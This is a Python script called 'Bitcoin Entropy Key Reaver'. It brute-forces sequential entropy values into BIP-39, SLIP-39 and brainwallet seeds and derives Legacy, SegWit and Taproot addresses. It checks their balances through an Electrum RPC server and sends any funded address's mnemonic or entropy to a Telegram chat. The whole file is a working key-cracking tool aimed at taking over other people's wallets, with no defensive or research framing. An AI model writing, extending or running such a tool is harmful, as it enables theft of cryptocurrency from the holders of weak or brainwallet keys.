#!/usr/bin/env python3

import argparse
import hashlib
import json
import os
import signal
import subprocess
import sys
import time
import bech32
import requests
import base58
import telegram
import configparser
from bitcoinlib.keys import HDKey, Address, Key
from bitcoinlib.mnemonic import Mnemonic
from slip39 import recover

CONFIG_DIR = os.path.expanduser("~/.config/keyreaver")
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.ini")
LAST_ENTROPY_FILE = os.path.join(CONFIG_DIR, "last_entropy.txt")

def load_config():
    config = configparser.ConfigParser()
    os.makedirs(CONFIG_DIR, exist_ok=True)
    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE)
    else:
        config['telegram'] = {'bot_token': '', 'chat_id': ''}
        config['rpc'] = {'url': 'http://127.0.0.1:7000', 'user': 'myuser', 'pass': 'mypass'}
        with open(CONFIG_FILE, 'w') as f:
            config.write(f)
        print(f"Created default config at {CONFIG_FILE}. Please edit it with your credentials.")
        sys.exit(1)
    return config

def batch_query_electrum_rpc(method, params_list, config):
    url = config['rpc']['url']
    session = requests.Session()
    session.auth = (config['rpc']['user'], config['rpc']['pass'])
    headers = {"Content-Type": "application/json"}
    payloads = [{"jsonrpc": "2.0", "id": i, "method": method, "params": params} for i, params in enumerate(params_list)]
    try:
        responses = []
        for payload in payloads:
            response = session.post(url, json=payload, headers=headers)
            response.raise_for_status()
            resp = json.loads(response.text)
            responses.append(resp)
        return {r["id"]: r for r in responses}
    except requests.RequestException as e:
        print(f"⚠️ Electrum RPC error: {e}")
        return {}
    except json.JSONDecodeError as e:
        print(f"⚠️ JSON decode error: {e}")
        return {}

def has_transaction_history(address, config):
    result = batch_query_electrum_rpc("getaddresshistory", [[address]], config)
    history = result.get(0, {}).get("result", [])
    return bool(history)

def get_address_balance(address, config):
    result = batch_query_electrum_rpc("getaddressbalance", [[address]], config)
    balance = result.get(0, {}).get("result", {})
    if balance:
        confirmed = int(float(balance.get("confirmed", "0")) * 1e8)
        balance["confirmed"] = confirmed
    return balance

def entropy_to_seeds(entropy):
    entropy_bytes = bytes.fromhex(entropy)
    results = {}
    try:
        mnemonic = Mnemonic().to_mnemonic(entropy_bytes)
        bip39_seed = Mnemonic().to_seed(mnemonic)
        results["BIP-39"] = (bip39_seed, mnemonic)
    except Exception:
        pass
    try:
        slip39_seed = entropy_bytes
        results["SLIP-39"] = (slip39_seed, None)
    except Exception:
        pass
    try:
        brainwallet_seed = hashlib.sha256(entropy_bytes).digest()
        results["Brainwallet"] = (brainwallet_seed, None)
    except Exception:
        pass
    try:
        raw_brainwallet_key = hashlib.sha256(entropy.encode()).hexdigest()
        results["Raw Brainwallet"] = (raw_brainwallet_key, None)
    except Exception:
        pass
    return results

def derive_address(seed, path, script_type="p2wpkh"):
    try:
        if not isinstance(seed, bytes):
            if isinstance(seed, str):
                key = Key(seed)
                return key.address(script_type="p2pkh")
            raise ValueError(f"Seed is not in bytes format: {type(seed)}")
        master_key = HDKey.from_seed(seed)
        derived_key = master_key.subkey_for_path(path)
        pubkey = derived_key.public().as_bytes()
        if script_type == "p2tr":
            return derive_taproot_address(pubkey[1:].hex())
        elif script_type == "p2sh-p2wpkh":
            pubkey_hash = hashlib.new('ripemd160', hashlib.sha256(pubkey).digest()).digest()
            witness_script = bytes([0x00, 0x14]) + pubkey_hash
            script_hash = hashlib.new('ripemd160', hashlib.sha256(witness_script).digest()).digest()
            return base58.b58encode_check(b"\x05" + script_hash).decode('ascii')
        address = Address(pubkey, script_type=script_type).address
        return address
    except Exception as e:
        print(f"❌ Error deriving address for path {path}: {e}")
        return None

def derive_taproot_address(x_only_pubkey):
    command = [
        "flatpak", "run", "--command=bitcoin-cli", "org.bitcoincore.bitcoin-qt",
        "-datadir=/mnt/storage/bitcoin", "getdescriptorinfo", f"tr({x_only_pubkey})"
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Error: {result.stderr}")
        return None
    desc_info = json.loads(result.stdout)
    if "descriptor" not in desc_info:
        return None
    command = [
        "flatpak", "run", "--command=bitcoin-cli", "org.bitcoincore.bitcoin-qt",
        "-datadir=/mnt/storage/bitcoin", "deriveaddresses", desc_info["descriptor"]
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Error: {result.stderr}")
        return None
    addresses = json.loads(result.stdout)
    return addresses[0] if addresses else None

def scan_addresses(seed_data, script_types, entropy, method, config, verbose=False, bot=None, chat_id=None):
    GAP_LIMIT = 20
    seed, mnemonic = seed_data if isinstance(seed_data, tuple) else (seed_data, None)
    if isinstance(seed, str):
        address = derive_address(seed, None, "p2pkh")
        if address:
            if verbose:
                print(f"✅ Raw Brainwallet: {address}")
            balance = get_address_balance(address, config)
            if balance and balance.get("confirmed", 0) > 0:
                msg = f"🎉 Found {balance['confirmed'] / 1e8:.8f} BTC at {address} (Raw Brainwallet)\nEntropy: {entropy}"
                print(msg, flush=True)
                if bot and chat_id:
                    bot.send_message(chat_id=chat_id, text=msg)
        return
    for stype, path, script in script_types:
        address = derive_address(seed, path, script)
        if address:
            if verbose:
                print(f"✅ {stype}: {address}")
            history = has_transaction_history(address, config)
            if history:
                print(f"📜 Transaction history found for {address} ({stype})", flush=True)
                base_path = "/".join(path.split("/")[:-1])
                consecutive_zeros = 0
                for i in range(GAP_LIMIT):
                    deep_path = f"{base_path}/{i}"
                    deep_addr = derive_address(seed, deep_path, script)
                    if deep_addr:
                        balance = get_address_balance(deep_addr, config)
                        if balance and balance.get("confirmed", 0) > 0:
                            short_path = f"{path.split('/')[1]}_{i}"
                            recovery_info = f"Mnemonic: {mnemonic}\nPath: {deep_path}" if mnemonic else f"Entropy: {entropy}\nPath: {deep_path}"
                            msg = f"🎉 Found {balance['confirmed'] / 1e8:.8f} BTC at {deep_addr} ({stype} {short_path})\n{recovery_info}"
                            print(msg, flush=True)
                            if bot and chat_id:
                                bot.send_message(chat_id=chat_id, text=msg)
                            consecutive_zeros = 0
                        else:
                            consecutive_zeros += 1
                            if consecutive_zeros >= GAP_LIMIT:
                                if verbose:
                                    print(f"🏁 Gap limit reached at {deep_addr}", flush=True)
                                break

def handle_shutdown(signum=None, frame=None):
    global start_time, check_count, entropy_int
    elapsed = time.time() - start_time
    cps = check_count / elapsed if elapsed > 0 else 0
    last_entropy = f"{entropy_int:032x}"
    print(f"\n⏹️ Shutdown. Last entropy: {last_entropy}", flush=True)
    print(f"🚀 Speed: {cps:.2f} entropy/s (Total: {check_count} in {elapsed:.2f}s)", flush=True)
    with open(LAST_ENTROPY_FILE, 'w') as f:
        f.write(last_entropy)
    subprocess.run(["pkill", "-f", "bitcoin-cli"])
    sys.exit(0)

def main():
    global start_time, check_count, entropy_int
    parser = argparse.ArgumentParser(description="Bitcoin Entropy Key Reaver")
    parser.add_argument("--entropy", type=str, help="Starting entropy hex")
    parser.add_argument("--verbose", action="store_true", help="Show detailed output")
    parser.add_argument("--increment", action="store_true", help="Increment entropy and continue")
    args = parser.parse_args()

    config = load_config()
    bot = telegram.Bot(config['telegram']['bot_token']) if config['telegram']['bot_token'] and config['telegram']['chat_id'] else None
    chat_id = config['telegram']['chat_id']

    if args.increment and not args.entropy:
        try:
            with open(LAST_ENTROPY_FILE, 'r') as f:
                entropy = f.read().strip()
        except FileNotFoundError:
            entropy = "0" * 32
    elif args.entropy:
        entropy = args.entropy
    else:
        parser.error("Either --entropy or --increment with a last_entropy file is required")

    script_types = [
        ("Legacy", "m/44'/0'/0'/0/0", "p2pkh"),
        ("Nested SegWit", "m/49'/0'/0'/0/0", "p2sh-p2wpkh"),
        ("SegWit", "m/84'/0'/0'/0/0", "p2wpkh"),
        ("Taproot", "m/86'/0'/0'/0/0", "p2tr")
    ]

    signal.signal(signal.SIGTERM, handle_shutdown)
    signal.signal(signal.SIGINT, handle_shutdown)
    start_time = time.time()
    check_count = 0
    entropy_int = int(entropy, 16)

    try:
        while True:
            current_entropy = f"{entropy_int:032x}"
            seeds = entropy_to_seeds(current_entropy)
            for method, seed_data in seeds.items():
                if args.verbose:
                    print(f"\n🔄 Trying {method}...")
                scan_addresses(seed_data, script_types if method != "Raw Brainwallet" else [], current_entropy, method, config, verbose=args.verbose, bot=bot, chat_id=chat_id)
            check_count += 1
            if not args.increment:
                break
            if args.verbose and check_count % 100 == 0:
                elapsed = time.time() - start_time
                print(f"Speed: {check_count / elapsed:.2f} entropy/s", end="\r", flush=True)
            entropy_int += 1
    except KeyboardInterrupt:
        handle_shutdown(None, None)

if __name__ == "__main__":
    main()

